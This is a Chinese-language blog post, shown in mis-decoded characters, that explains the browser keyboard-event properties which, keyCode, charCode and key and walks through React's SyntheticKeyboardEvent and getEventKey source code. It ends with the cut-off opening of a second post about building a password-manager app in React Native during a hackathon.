ä¸é MDN é™„çš„åƒè€ƒè³‡æ–™å¯«çš„æ»¿æ¨¡ç³Šçš„ï¼Œæ‰€ä»¥é€™éƒ¨åˆ†æˆ‘ä¹Ÿä¸æ˜¯å¾ˆç¢ºå®šï¼š

which holds a system- and implementation-dependent numerical code signifying the unmodified identifier associated with the key pressed. In most cases, the value is identical to keyCode.

ä¾†æºï¼šhttps://www.w3.org/TR/2014/WD-DOM-Level-3-Events-20140925/#widl-KeyboardEvent-which
æ¥è‘—ä¾†çœ‹ä¸€ä¸‹ keyï¼š

The KeyboardEvent.key read-only property returns the value of the key pressed by the user while taking into considerations the state of modifier keys such as the shiftKey as well as the keyboard locale&#x2F;layou

ä¾†æºï¼šhttps://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/key
ç°¡å–®ä¾†èªª key æœƒæ˜¯ä¸€å€‹å­—ä¸²ï¼Œä½ å‰›å‰›æŒ‰äº†ä»€éº¼æŒ‰éµæˆ–æ˜¯æ‰“äº†ä»€éº¼å­—ï¼Œkey å°±æœƒæ˜¯ä»€éº¼ã€‚ä¸Šé¢ MDN çš„ç¶²é ä¸‹æ–¹æœ‰é™„ä¸€å€‹ç°¡å–®çš„ç¯„ä¾‹è®“ä½ ä¾†æ¸¬è©¦ key çš„å€¼ã€‚
ä¾‹å¦‚èªªæˆ‘è¼¸å…¥ Aï¼Œkey å°±æ˜¯ Aï¼ŒæŒ‰ä¸‹ Shiftï¼Œkey å°±æ˜¯ Shiftã€‚
é‚„æœ‰ä¸€é»è¦æ³¨æ„çš„æ˜¯ï¼Œé€™å€‹å±¬æ€§åœ¨ keyPress æˆ–æ˜¯ keyDown äº‹ä»¶è£¡é¢éƒ½æ‹¿å¾—åˆ°ã€‚æ‰€ä»¥å„˜ç®¡æ˜¯ keyDown äº‹ä»¶ï¼Œä½ ä¹Ÿèƒ½çŸ¥é“ä½¿ç”¨è€…å‰›å‰›è¼¸å…¥äº†ä»€éº¼æˆ–æ˜¯æŒ‰äº†ä»€éº¼æŒ‰éµã€‚
ä½†å„˜ç®¡å¦‚æ­¤ï¼Œé—œæ–¼ã€Œåµæ¸¬è¼¸å…¥ã€çš„äº‹ä»¶æ‡‰è©²é‚„æ˜¯ç”¨ keyPress æœ€åˆé©ï¼Œé™¤éä½ æƒ³è¦åµæ¸¬å…¶ä»–ä¸æœƒç”¢ç”Ÿå­—å…ƒçš„æŒ‰éµï¼ˆCtrl, Delete, Shiftâ€¦ï¼‰æ‰ç”¨ keyDown äº‹ä»¶ã€‚
åœ¨é€™é‚Šåšå€‹ä¸­å ´ç¸½çµï¼Œå…¶å¯¦é€™äº› whichã€keyCode è·Ÿ charCodeï¼Œåœ¨ä¸åŒç€è¦½å™¨ä¸Šé¢éƒ½å¯èƒ½æœ‰ä¸åŒçš„è¡¨ç¾ï¼Œæ‰€ä»¥æ˜¯è·¨ç€è¦½å™¨æ”¯æ´ä¸€å€‹å¾ˆéº»ç…©çš„éƒ¨åˆ†ï¼Œå¾é€™å€‹æ–¹å‘å»æ‰¾ï¼Œä½ å¯ä»¥æ‰¾åˆ°ä¸€å¤§å †åœ¨è¬›ç€è¦½å™¨ç›¸å®¹æ€§çš„æ–‡ç« ã€‚
ä½†è¿‘å¹¾å¹´ä¾†èˆŠçš„ç€è¦½å™¨æ¼¸æ¼¸è¢«æ·˜æ±°ï¼Œå¤§éƒ¨åˆ†çš„ä½¿ç”¨è€…åœ¨ç”¨çš„ç€è¦½å™¨æ‡‰è©²éƒ½æ¯”è¼ƒç¬¦åˆæ¨™æº–äº†ï¼Œå› æ­¤ç›¸å®¹æ€§ä¸¦ä¸æ˜¯æœ¬ç¯‡æ–‡ç« çš„é‡é»ï¼Œæ‰€ä»¥å°±æ²’æœ‰å¤šæäº†ã€‚
æ¥ä¸‹ä¾†çµ‚æ–¼è¦åˆ°å¯èƒ½æ˜¯æœ€å¸å¼•ä½ çš„éƒ¨åˆ†ï¼šReact åŸå§‹ç¢¼ã€‚
åˆæ¢ React åŸå§‹ç¢¼React åŸå§‹ç¢¼é€™éº¼å¤§ï¼Œè©²å¾ä½•æ‰¾èµ·å‘¢ï¼Ÿ
é€™é‚Šæ¨è–¦ä¸€å€‹è¶…ç´šå¥½ç”¨çš„æ–¹æ³•ï¼šGitHub çš„æœå°‹ã€‚é€šå¸¸åªè¦æ‹¿ä½ æƒ³æ‰¾çš„ function åç¨±æˆ–æ˜¯ç›¸é—œçš„é—œéµå­—ä¸‹å»æœå°‹ï¼Œå°±èƒ½å¤ æŠŠç¯„åœé™ç¸®çš„å¾ˆå°ï¼Œåªè¦ç”¨è‚‰çœ¼å†ç¿»ä¸€ä¸‹è³‡æ–™å°±èƒ½å¤ æ‰¾åˆ°ç›¸å°æ‡‰çš„åŸå§‹ç¢¼ï¼Œæ˜¯æ–¹ä¾¿åˆå¥½ç”¨çš„ä¸€å€‹æ–¹æ³•ã€‚
é€™é‚Šæˆ‘å€‘ç”¨keyPressä¾†ç•¶é—œéµå­—ï¼Œå‡ºç¾äº† 12 ç­†çµæœï¼š

ç”¨è‚‰çœ¼ç¨å¾®ç¯©é¸ä¸€ä¸‹ï¼Œç™¼ç¾å¾ˆå¤šéƒ½æ˜¯æ¸¬è©¦ï¼Œé‚£äº›éƒ½å¯ä»¥ç›´æ¥è·³éã€‚ä½ æ‡‰è©²å¾ˆå¿«å°±èƒ½å®šä½åˆ°å¹¾å€‹ç›¸é—œçš„æª”æ¡ˆï¼Œåƒæ˜¯é€™å…©å€‹ï¼š

packages&#x2F;react-dom&#x2F;src&#x2F;events&#x2F;SyntheticKeyboardEvent.js
packages&#x2F;react-dom&#x2F;src&#x2F;events&#x2F;getEventKey.js

æ²’éŒ¯ï¼Œé€™å…©å€‹å°±æ˜¯ä»Šå¤©çš„ä¸»è§’ã€‚
æˆ‘å€‘å…ˆä¾†çœ‹SyntheticKeyboardEvent.jsï¼Œå¦‚æœä½ å° React é‚„ç®—ç†Ÿæ‚‰çš„è©±ï¼Œæ‡‰è©²çŸ¥é“ä½ åœ¨è£¡é¢æ‹¿åˆ°çš„äº‹ä»¶éƒ½ä¸æ˜¯åŸç”Ÿçš„äº‹ä»¶ï¼Œè€Œæ˜¯ React æœƒåŒ…è£éä¹‹å¾Œå†ä¸Ÿçµ¦ä½ ï¼Œè€Œç¾åœ¨é€™å€‹SyntheticKeyboardEventå°±æ˜¯ç¶“é React åŒ…è£å¾Œçš„äº‹ä»¶ï¼Œå°±æ˜¯ä½ åœ¨ onKeyPress æˆ–æ˜¯ onKeyDown çš„æ™‚å€™æœƒæ‹¿åˆ°çš„ eã€‚
ç‚ºäº†æ–¹ä¾¿èµ·è¦‹ï¼Œæˆ‘å€‘åˆ‡æˆå¹¾å€‹ functionï¼Œä¸€å€‹ä¸€å€‹ä¾†çœ‹ã€‚
charCode: function(event) &#123;  // `charCode` is the result of a KeyPress event and represents the value of  // the actual printable character.    // KeyPress is deprecated, but its replacement is not yet final and not  // implemented in any major browser. Only KeyPress has charCode.  if (event.type === &#x27;keypress&#x27;) &#123;    return getEventCharCode(event);  &#125;  return 0;&#125;

é€™é‚Šè¨»è§£å¯«å¾—å¾ˆæ£’ï¼Œèª¬ keyPress å·²ç¶“è¢« deprecated äº†ä½†æ˜¯æ›¿ä»£å“é‚„æ²’æº–å‚™å¥½ã€‚å†è€…ï¼Œä¹Ÿæåˆ°äº†åªæœ‰ keyPress æœ‰ charCodeã€‚
æ‰€ä»¥é€™é‚Šå°±æ˜¯åˆ¤æ–· event çš„ type æ˜¯ä¸æ˜¯ keypressï¼Œæ˜¯çš„è©±å°±å›å‚³getEventCharCode(event)ï¼Œå¦å‰‡å›å‚³ 0ã€‚
æ¥è‘—æˆ‘å€‘ä¾†çœ‹ä¸€ä¸‹getEventCharCodeåœ¨åšä»€éº¼ï¼ˆå°æé†’ï¼Œé€™å€‹å‡½å¼åœ¨å¦å¤–ä¸€å€‹æª”æ¡ˆï¼‰ï¼š
/** * `charCode` represents the actual &quot;character code&quot; and is safe to use with * `String.fromCharCode`. As such, only keys that correspond to printable * characters produce a valid `charCode`, the only exception to this is Enter. * The Tab-key is considered non-printable and does not have a `charCode`, * presumably because it does not produce a tab-character in browsers. * * @param &#123;object&#125; nativeEvent Native browser event. * @return &#123;number&#125; Normalized `charCode` property. */function getEventCharCode(nativeEvent) &#123;  let charCode;  const keyCode = nativeEvent.keyCode;    if (&#x27;charCode&#x27; in nativeEvent) &#123;    charCode = nativeEvent.charCode;      // FF does not set `charCode` for the Enter-key, check against `keyCode`.    if (charCode === 0 &amp;&amp; keyCode === 13) &#123;      charCode = 13;    &#125;  &#125; else &#123;    // IE8 does not implement `charCode`, but `keyCode` has the correct value.    charCode = keyCode;  &#125;    // IE and Edge (on Windows) and Chrome / Safari (on Windows and Linux)  // report Enter as charCode 10 when ctrl is pressed.  if (charCode === 10) &#123;    charCode = 13;  &#125;    // Some non-printable keys are reported in `charCode`/`keyCode`, discard them.  // Must not discard the (non-)printable Enter-key.  if (charCode &gt;= 32 || charCode === 13) &#123;    return charCode;  &#125;    return 0;&#125;

æ¥è‘—æˆ‘å€‘ä¸€æ¨£åˆ†æ®µä¾†çœ‹æ¯”è¼ƒæ–¹ä¾¿ï¼š
/** * `charCode` represents the actual &quot;character code&quot; and is safe to use with * `String.fromCharCode`. As such, only keys that correspond to printable * characters produce a valid `charCode`, the only exception to this is Enter. * The Tab-key is considered non-printable and does not have a `charCode`, * presumably because it does not produce a tab-character in browsers. * * @param &#123;object&#125; nativeEvent Native browser event. * @return &#123;number&#125; Normalized `charCode` property. */

é–‹é ­çš„è¨»è§£å…ˆè·Ÿä½ èªª charCode ä»£è¡¨çš„å°±æ˜¯ character codeï¼Œæ‰€ä»¥å¯ä»¥ç”¨ String.fromCharCode ä¾†æ‰¾å‡ºæ­é…çš„å­—å…ƒã€‚
å› æ­¤ï¼Œåªæœ‰èƒ½è¢«å°å‡ºä¾†ï¼ˆæˆ–è€…æ˜¯èªªå¯ä»¥è¢«é¡¯ç¤ºå‡ºä¾†ï¼‰çš„å­—å…ƒæ‰æœ‰ charCodeï¼Œè€Œ Enter æ˜¯ä¸€å€‹ä¾‹å¤–ï¼Œå› ç‚º Enter æœƒç”¢ç”Ÿç©ºè¡Œã€‚ä½† Tab ä¸æ˜¯ï¼Œå› ç‚ºä½ æŒ‰ Tab ä¸æœƒç”¢ç”Ÿä¸€å€‹ä»£è¡¨ Tab çš„å­—å…ƒã€‚
let charCode;const keyCode = nativeEvent.keyCode;  if (&#x27;charCode&#x27; in nativeEvent) &#123;  charCode = nativeEvent.charCode;    // FF does not set `charCode` for the Enter-key, check against `keyCode`.  if (charCode === 0 &amp;&amp; keyCode === 13) &#123;    charCode = 13;  &#125;&#125; else &#123;  // IE8 does not implement `charCode`, but `keyCode` has the correct value.  charCode = keyCode;&#125;

é€™é‚Šé‡å°ç€è¦½å™¨çš„ç›¸å®¹æ€§åšè™•ç†ï¼ŒFireFox æ²’æœ‰å¹« Enter è¨­å®š charCodeï¼Œæ‰€ä»¥è¦é¡å¤–åˆ¤æ–· keyCode æ˜¯ä¸æ˜¯ 13ã€‚ç„¶å¾Œ IE8 æ²’æœ‰å¯¦ä½œ charCodeï¼Œæ‰€ä»¥ç”¨ keyCode çš„å€¼ä¾†å–ä»£ã€‚
// IE and Edge (on Windows) and Chrome / Safari (on Windows and Linux)// report Enter as charCode 10 when ctrl is pressed.if (charCode === 10) &#123;  charCode = 13;&#125;  // Some non-printable keys are reported in `charCode`/`keyCode`, discard them.// Must not discard the (non-)printable Enter-key.if (charCode &gt;= 32 || charCode === 13) &#123;  return charCode;&#125;

é€™é‚Šæ‡‰è©²ç®—æ˜¯ä¸€å€‹ special caseï¼Œç•¶ä½¿ç”¨è€…æŒ‰ä¸‹ Ctrl + Enter æ™‚çš„ charCode æ˜¯ 10ï¼ŒReact æƒ³æŠŠé€™å€‹ä¹Ÿç•¶ä½œæŒ‰ä¸‹ Enter ä¾†è™•ç†ã€‚
å¦å¤–ï¼Œæœ‰äº›æ²’è¾¦æ³•è¢«å°å‡ºä¾†çš„å­—å…ƒæ‡‰è©²è¦è¢«æ‹¿æ‰ï¼Œæ‰€ä»¥æœ€å¾Œåšäº†ä¸€å€‹ç¯„åœçš„åˆ¤æ–·ã€‚
charCode çš„è™•ç†å°±æ˜¯é€™æ¨£äº†ï¼Œä»”ç´°çœ‹çœ‹å…¶å¯¦é‚„æ»¿æœ‰è¶£çš„ï¼Œé‡å°ç€è¦½å™¨çš„ç›¸å®¹æ€§è·Ÿä¸€äº›ç‰¹æ®Šç‹€æ³åšäº†è™•ç†ã€‚
æ¥è‘—æˆ‘å€‘å›åˆ°SyntheticKeyboardEvent.jsï¼Œä¾†çœ‹çœ‹ keyCode çš„è™•ç†ï¼š
keyCode: function(event) &#123;  // `keyCode` is the result of a KeyDown/Up event and represents the value of  // physical keyboard key.    // The actual meaning of the value depends on the users&#x27; keyboard layout  // which cannot be detected. Assuming that it is a US keyboard layout  // provides a surprisingly accurate mapping for US and European users.  // Due to this, it is left to the user to implement at this time.  if (event.type === &#x27;keydown&#x27; || event.type === &#x27;keyup&#x27;) &#123;    return event.keyCode;  &#125;  return 0;&#125;

é€™é‚Šèªª keyCode çš„å€¼å…¶å¯¦æ˜¯ä¾è³´æ–¼éµç›¤çš„ï¼Œæ„æ€æ˜¯èªªæœ‰äº›éµç›¤å¯èƒ½æœƒç”¢ç”Ÿä¸å¤ªä¸€æ¨£çš„ keyCodeï¼Œä½†å› ç‚ºå¤§å¤šæ•¸ç¾åœ‹è·Ÿæ­æ´²çš„ä½¿ç”¨è€…éƒ½æ˜¯ US keyboardï¼Œæ‰€ä»¥é€™é‚Šå°±ç›´æ¥æŠŠ keyCode ä¸Ÿå›å»è€Œä¸åšç‰¹æ®Šè™•ç†ã€‚
å…¶å¯¦é€™ä¸€æ®µæˆ‘æ²’æœ‰çœ‹å¾—å®Œå…¨æ‡‚ï¼Œåªæ˜¯å¤§æ¦‚çŒœä¸€ä¸‹æ„æ€è€Œå·²ã€‚é€™é‚ŠæŒ‡çš„ã€Œkeyboard layoutã€å¯èƒ½æ˜¯åƒ QWERTY æˆ–æ˜¯ Dvorak é€™ç¨®çš„ layoutï¼ŒæŒ‰éµçš„æ’åˆ—æ–¹å¼å®Œå…¨ä¸åŒã€‚ä½†å¦‚æœé€™æ¨£å°±æœƒç”¢ç”Ÿä¸åŒçš„ keyCode çš„è©±ï¼Œæ˜¯ä¸æ˜¯ä»£è¡¨æœ‰äº›ç¶²ç«™å¯èƒ½æœƒæœ‰ bugï¼Ÿ
ä¸éå¤§å¤šæ•¸äººçš„éµç›¤éƒ½æ˜¯åŒæ¨£çš„æ’åˆ—ï¼Œæ‰€ä»¥å¥½åƒä¸ç”¨å¤ªæ“”å¿ƒé€™å€‹å•é¡Œã€‚
which: function(event) &#123;  // `which` is an alias for either `keyCode` or `charCode` depending on the  // type of the event.  if (event.type === &#x27;keypress&#x27;) &#123;    return getEventCharCode(event);  &#125;  if (event.type === &#x27;keydown&#x27; || event.type === &#x27;keyup&#x27;) &#123;    return event.keyCode;  &#125;  return 0;&#125;

æœ€å¾Œæ˜¯ which çš„éƒ¨åˆ†ï¼Œå¦‚æœæ˜¯ keypress å°±æŠŠ charCode å‚³å›å»ï¼Œkeydown æˆ–æ˜¯ keyup çš„è©±å°±æŠŠ keyCode å‚³å›å»ã€‚
è¬›åˆ°é€™è£¡ï¼Œæˆ‘å€‘å·²ç¶“çœ‹åˆ° React å°æ–¼ charCodeã€keyCode ä»¥åŠ which çš„è™•ç†äº†ï¼ŒcharCode é‡å°ç‰¹æ®Šæƒ…å½¢ä»¥åŠç€è¦½å™¨ç›¸å®¹æ€§åšæª¢æŸ¥ï¼ŒkeyCode ç›´æ¥å›å‚³ï¼Œwhich å‰‡æ ¹æ“šäº‹ä»¶ä¸åŒå›å‚³ç›¸å°æ‡‰çš„å€¼ã€‚
æœ€å¾Œæˆ‘å€‘ä¾†çœ‹ä¸€ä¸‹ key çš„è™•ç†ï¼Œé€™é‚Šæ”¾åœ¨å¦å¤–ä¸€å€‹æª”æ¡ˆå«åšgetEventKey.jsï¼š
/** * Normalization of deprecated HTML5 `key` values * @see https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent#Key_names */const normalizeKey = &#123;  Esc: &#x27;Escape&#x27;,  Spacebar: &#x27; &#x27;,  Left: &#x27;ArrowLeft&#x27;,  Up: &#x27;ArrowUp&#x27;,  Right: &#x27;ArrowRight&#x27;,  Down: &#x27;ArrowDown&#x27;,  Del: &#x27;Delete&#x27;,  Win: &#x27;OS&#x27;,  Menu: &#x27;ContextMenu&#x27;,  Apps: &#x27;ContextMenu&#x27;,  Scroll: &#x27;ScrollLock&#x27;,  MozPrintableKey: &#x27;Unidentified&#x27;,&#125;;  /** * Translation from legacy `keyCode` to HTML5 `key` * Only special keys supported, all others depend on keyboard layout or browser * @see https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent#Key_names */const translateToKey = &#123;  &#x27;8&#x27;: &#x27;Backspace&#x27;,  &#x27;9&#x27;: &#x27;Tab&#x27;,  &#x27;12&#x27;: &#x27;Clear&#x27;,  &#x27;13&#x27;: &#x27;Enter&#x27;,  &#x27;16&#x27;: &#x27;Shift&#x27;,  &#x27;17&#x27;: &#x27;Control&#x27;,  &#x27;18&#x27;: &#x27;Alt&#x27;,  &#x27;19&#x27;: &#x27;Pause&#x27;,  &#x27;20&#x27;: &#x27;CapsLock&#x27;,  &#x27;27&#x27;: &#x27;Escape&#x27;,  &#x27;32&#x27;: &#x27; &#x27;,  &#x27;33&#x27;: &#x27;PageUp&#x27;,  &#x27;34&#x27;: &#x27;PageDown&#x27;,  &#x27;35&#x27;: &#x27;End&#x27;,  &#x27;36&#x27;: &#x27;Home&#x27;,  &#x27;37&#x27;: &#x27;ArrowLeft&#x27;,  &#x27;38&#x27;: &#x27;ArrowUp&#x27;,  &#x27;39&#x27;: &#x27;ArrowRight&#x27;,  &#x27;40&#x27;: &#x27;ArrowDown&#x27;,  &#x27;45&#x27;: &#x27;Insert&#x27;,  &#x27;46&#x27;: &#x27;Delete&#x27;,  &#x27;112&#x27;: &#x27;F1&#x27;,  &#x27;113&#x27;: &#x27;F2&#x27;,  &#x27;114&#x27;: &#x27;F3&#x27;,  &#x27;115&#x27;: &#x27;F4&#x27;,  &#x27;116&#x27;: &#x27;F5&#x27;,  &#x27;117&#x27;: &#x27;F6&#x27;,  &#x27;118&#x27;: &#x27;F7&#x27;,  &#x27;119&#x27;: &#x27;F8&#x27;,  &#x27;120&#x27;: &#x27;F9&#x27;,  &#x27;121&#x27;: &#x27;F10&#x27;,  &#x27;122&#x27;: &#x27;F11&#x27;,  &#x27;123&#x27;: &#x27;F12&#x27;,  &#x27;144&#x27;: &#x27;NumLock&#x27;,  &#x27;145&#x27;: &#x27;ScrollLock&#x27;,  &#x27;224&#x27;: &#x27;Meta&#x27;,&#125;;  /** * @param &#123;object&#125; nativeEvent Native browser event. * @return &#123;string&#125; Normalized `key` property. */function getEventKey(nativeEvent: KeyboardEvent): string &#123;  if (nativeEvent.key) &#123;    // Normalize inconsistent values reported by browsers due to    // implementations of a working draft specification.      // FireFox implements `key` but returns `MozPrintableKey` for all    // printable characters (normalized to `Unidentified`), ignore it.    const key = normalizeKey[nativeEvent.key] || nativeEvent.key;    if (key !== &#x27;Unidentified&#x27;) &#123;      return key;    &#125;  &#125;    // Browser does not implement `key`, polyfill as much of it as we can.  if (nativeEvent.type === &#x27;keypress&#x27;) &#123;    const charCode = getEventCharCode(nativeEvent);      // The enter-key is technically both printable and non-printable and can    // thus be captured by `keypress`, no other non-printable key should.    return charCode === 13 ? &#x27;Enter&#x27; : String.fromCharCode(charCode);  &#125;  if (nativeEvent.type === &#x27;keydown&#x27; || nativeEvent.type === &#x27;keyup&#x27;) &#123;    // While user keyboard layout determines the actual meaning of each    // `keyCode` value, almost all function keys have a universal value.    return translateToKey[nativeEvent.keyCode] || &#x27;Unidentified&#x27;;  &#125;  return &#x27;&#x27;;&#125;

é€™é‚Šä¸€æ¨£æ˜¯é‡å°ç€è¦½å™¨çš„ç›¸å®¹æ€§åšè™•ç†ï¼Œå¦‚æœ event æœ¬èº«å°±æœ‰ key çš„è©±ï¼Œå…ˆåš normalizeï¼ŒæŠŠå›å‚³çš„çµæœçµ±ä¸€æˆç›¸åŒçš„æ ¼å¼ã€‚è€Œ FireFox æœƒæŠŠå¯ä»¥å°å‡ºçš„å­—å…ƒéƒ½è¨­å®šæˆ MozPrintableKeyï¼Œé€™é‚Š normalize æˆ Unidentifiedã€‚
å¦‚æœ normalize å®Œä¹‹å¾Œçš„ key ä¸æ˜¯Unidentifiedçš„è©±å°±å›å‚³ï¼Œå¦å‰‡å†åšé€²ä¸€æ­¥è™•ç†ã€‚
è€Œé€™å€‹é€²ä¸€æ­¥è™•ç†æŒ‡çš„å°±æ˜¯ polyfillï¼Œå¦‚æœæ²’æœ‰ key å¯ä»¥ç”¨çš„è©±å°±è‡ªå·±é‡å° charCode æˆ–æ˜¯ keyCode ä¾†åšè™•ç†ï¼Œå›å‚³ç›¸å°æ‡‰çš„å­—å…ƒæˆ–æ˜¯æŒ‰éµåç¨±ã€‚
React å°æ–¼é€™äº›æŒ‰éµç›¸é—œäº‹ä»¶çš„è™•ç†å°±åˆ°é€™é‚Šå·®ä¸å¤šäº†ã€‚
åŸå§‹ç¢¼è¨»è§£å¯«çš„å¾ˆå¥½ï¼Œå¯ä»¥ç²å¾—å¾ˆå¤šç›¸é—œè³‡è¨Šï¼Œè€Œç¨‹å¼ç¢¼å¾ˆçŸ­åˆä¸è¤‡é›œï¼Œçœ‹èµ·ä¾†ä¹Ÿå¾ˆè¼•é¬†ï¼Œæ˜¯å€‹å¾ˆé©åˆå…¥é–€çš„åˆ‡å…¥é»ã€‚
ç¸½çµä»¥å‰ç”¨äº†é€™éº¼å¤šæ¬¡é€™äº›æŒ‰éµç›¸é—œäº‹ä»¶ï¼Œæˆ‘è‡ªå·²å»å¾ä¾†æ²’æƒ³éé€™äº›çš„å€åˆ¥ã€‚è¦å˜›å°±æ˜¯éš¨æ„å¯«å¯«ç„¶å¾Œå‡º bugï¼Œè¦å˜›å°±æ˜¯ç›´æ¥å¾ stackoverflow ä¸Šé¢è¤‡è£½æœ€ä½³è§£ç­”ï¼Œå¾ä¾†éƒ½ä¸çŸ¥é“é€™äº›çš„å·®ç•°ã€‚
é€™æ¬¡å‰›å¥½æ˜¯å› ç‚ºè¦å¹«äººè§£æƒ‘æ‰å»æ·±å…¥ç ”ç©¶ï¼Œæ²’æƒ³åˆ°ä¸€å€‹ç°¡å–®çš„æŒ‰éµäº‹ä»¶å…¶å¯¦ä¹Ÿæ˜¯æ°´å¾ˆæ·±ï¼Œå¯èƒ½è¦çœŸçš„è¸©éé›·æ‰æœƒæ›´æœ‰æ„Ÿè§¸ã€‚æœ€éº»ç…©çš„å…¶å¯¦æ˜¯ç€è¦½å™¨çš„ç›¸å®¹æ€§ï¼Œå„å€‹ç€è¦½å™¨å¯èƒ½éƒ½æœ‰è‡ªå·±ä¸åŒçš„å¯¦ä½œï¼Œè¦æ€éº¼è™•ç†é€™äº›ä¸åŒçš„æƒ…æ³æ‰æ˜¯éº»ç…©çš„åœ°æ–¹ã€‚
æåˆ° React åŸå§‹ç¢¼ï¼Œå¤§å®¶æƒ³åˆ°çš„å¯èƒ½éƒ½æ˜¯ render çš„ç›¸é—œæ©Ÿåˆ¶æˆ–æ˜¯ component çš„è™•ç†ï¼Œé‚£äº›åŸå§‹ç¢¼ååˆ†è¤‡é›œï¼Œè€Œä¸”å¿…é ˆè¦å°æ•´é«”çš„æ¶æ§‹æœ‰ä¸€å®šçš„ç†è§£æ‰æ¯”è¼ƒå¥½çœ‹æ‡‚ã€‚
é€™ç¯‡é¸æ“‡å¾ keyboard çš„äº‹ä»¶å‡ºç™¼ï¼Œä¾†çœ‹ React é‡å°é€™éƒ¨ä»½çš„è™•ç†ã€‚ç›¸ä¿¡ç¨‹å¼ç¢¼å¤§å®¶éƒ½çœ‹å¾—æ‡‚ï¼Œä¹Ÿä¸æœƒè¦ºå¾—ç‰¹åˆ¥é›£ï¼Œå°±æ˜¯æƒ³å‘Šè¨´å¤§å®¶è‹¥æ˜¯ä½ æƒ³ç ”ç©¶å…¶ä»–äººçš„åŸå§‹ç¢¼ï¼Œæœ‰æ™‚å€™ä¸ä¸€å®šè¦æ•´å€‹å°ˆæ¡ˆéƒ½çœ‹æ‡‚ï¼Œå¯ä»¥å…ˆå¾ä¸€äº›å°åœ°æ–¹é–‹å§‹ä¸‹æ‰‹ã€‚
å¾ utils é€™ç¨®ç°¡å–®çš„ function é–‹å§‹ä¹Ÿè¡Œï¼Œä¸ä¸€å®šè¦å¾æœ€é›£çš„é–‹å§‹æŒ‘æˆ°ï¼Œä½ éƒ½èƒ½å­¸åˆ°å¾ˆå¤šæ±è¥¿ã€‚
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title>React Native in 24 Hours</title>
    <url>/2016/11/10/react-native-in-24-hours/</url>
    <content><![CDATA[

å‰è¨€ä¸Šå€‹ç¦®æ‹œçš„æ™‚å€™ï¼Œæˆ‘å€‘å…¬å¸èˆ‰è¾¦äº†ä¸€å¹´ä¸€åº¦çš„é»‘å®¢æ¾ï¼Œä¸€éšŠæœ‰å››å€‹äººã€‚å› ç‚ºæˆ‘æ‰å‰›åŠ å…¥å…¬å¸å¤§æ¦‚å…©å€‹ç¦®æ‹œè€Œå·²ï¼Œæ‰€ä»¥ä¹Ÿæ²’èªè­˜ä»€éº¼äººã€‚ä¸éï¼Œå‰›å¥½ç•¶åˆæ‰¾æˆ‘é€²ä¾†çš„åŒäº‹å•æˆ‘è¦ä¸è¦ä¸€èµ·åƒåŠ ï¼Œå°±è·Ÿè‘—å ±åäº†ã€‚
é»‘å®¢æ¾çš„æ™‚é–“æ˜¯ç¦®æ‹œäº”æ—©ä¸Šåä¸€é»åˆ°ç¦®æ‹œå…­åŒä¸€æ™‚é–“ï¼Œä¸€å…± 24 å€‹å°æ™‚ã€‚æˆ‘çš„ä¸‰å€‹éšŠå‹ï¼Œä¸€å€‹æ˜¯ PMã€ä¸€å€‹æ˜¯è³‡å®‰éƒ¨é–€ã€ä¸€å€‹æ˜¯ SAï¼ˆSystem Adminï¼‰ éƒ¨é–€ã€‚å› æ­¤ï¼Œåœ¨ä»–å€‘çŸ¥é“æˆ‘ç¾åœ¨æ˜¯å‰ç«¯å·¥ç¨‹å¸«ï¼Œä»¥å‰æ˜¯ Android å·¥ç¨‹å¸«ä»¥å¾Œï¼Œç†æ‰€ç•¶ç„¶åœ°ï¼ŒMobile App çš„éƒ¨åˆ†å°±ç”±æˆ‘è² è²¬äº†ã€‚
é€™ä¹Ÿæ˜¯é€™ç¯‡æ¨™é¡Œçš„ç”±ä¾†ï¼šReact Native in 24 hoursï¼Œæƒ³è·Ÿå¤§å®¶åˆ†äº«åœ¨ 24 å°æ™‚ä¹‹å…§ï¼Œå¯ä»¥ç”¨ React Native åšå‡ºä»€éº¼æ¨£çš„ä½œå“ï¼Œä»¥åŠéç¨‹ä¸­ç¢°åˆ°çš„å›°é›£åŠæŒ‘æˆ°ã€‚
Ideaå…ˆç°¡å–®è«‡ä¸€ä¸‹æˆ‘å€‘é€™çµ„é‚£æ™‚å€™æƒ³åšçš„æ±è¥¿ï¼Œæ˜¯ä¸€å€‹ Password generator and managerã€‚
å¤§å®¶éƒ½çŸ¥é“ï¼Œè¨˜æ†¶å¯†ç¢¼æ˜¯ä¸€ä»¶å¾ˆéº»ç…©çš„äº‹æƒ…ï¼Œæ‰€ä»¥ï¼Œå¾ˆå¤šäººæœƒåœ¨æ¯å€‹ç¶²ç«™éƒ½ç”¨åŒä¸€çµ„å¯†ç¢¼ã€‚è€Œå¤§å®¶ä¹ŸçŸ¥é“ï¼Œé€™æ¨£çš„å£è™•å°±æ˜¯ï¼Œç•¶ä½ å…¶ä¸­ä¸€å€‹ç¶²ç«™çš„å¯†ç¢¼å¤–æ´©ä»¥å¾Œï¼Œå…¶ä»–ç¶²ç«™ä¹Ÿæœƒè·Ÿè‘—é­æ®ƒï¼Œé€™æ˜¯ä¸€ä»¶æ»¿å¯æ€•çš„äº‹æƒ…ã€‚
å› æ­¤æœ‰å¾ˆå¤šäººæœƒç”¨å¯†ç¢¼ç®¡ç†æœå‹™ï¼Œåªè¦è¨˜ä½é€™å€‹æœå‹™çš„å¯†ç¢¼ï¼Œå…¶ä»–å¯†ç¢¼éƒ½é é€™å€‹ç¶²ç«™å¹«ä½ å„²å­˜ã€‚å¯æ˜¯ï¼Œæˆ‘çš„éšŠå‹è¦ºå¾—é€™æ¨£ä¾ç„¶æœƒæœ‰å•é¡Œï¼Œé‚£å°±æ˜¯é€™å€‹ç¶²ç«™ä»ç„¶æœ‰å®‰å…¨æ€§çš„é¢¨éšªã€‚æœ‰æ²’æœ‰å¯èƒ½å®Œå…¨ä¸å„²å­˜å¯†ç¢¼å‘¢ï¼Ÿ
